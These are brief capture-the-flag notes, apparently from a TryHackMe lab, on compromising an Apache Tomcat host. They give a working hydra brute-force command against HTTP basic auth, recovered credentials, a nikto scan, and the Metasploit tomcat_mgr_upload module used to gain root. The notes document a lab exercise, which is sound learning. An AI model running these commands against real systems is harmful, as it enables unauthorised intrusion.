22  
80  
1234 Apache Tomcat/Coyote JSP engine 1.1  
8009 Apache Jserv (Protocol v1.3)
 
/guidelines/  
bob  
/protected (basic auth)
 
hydra -t 4 -l bob -P thm/rockyou.txt 10.10.190.140 http-get /protected  
bob:bubbles  
login to :80; try 1234
 
nikto -h <IP> -id bob:bubbles  
port 1234  
| /examples/: Sample scripts  
| /manager/html/upload: Apache Tomcat (401 Unauthorized)  
| /manager/html: Apache Tomcat (401 Unauthorized)  
|_ /docs/: Potentially interesting folder
 
since we can login to tomcat server, use metasploit:  
multi/http/tomcat_mgr_upload  
Might have to change payload  
root
 
LL:  
hydra for http basic auth  
using nikto with creds  
use metasploit for tomcat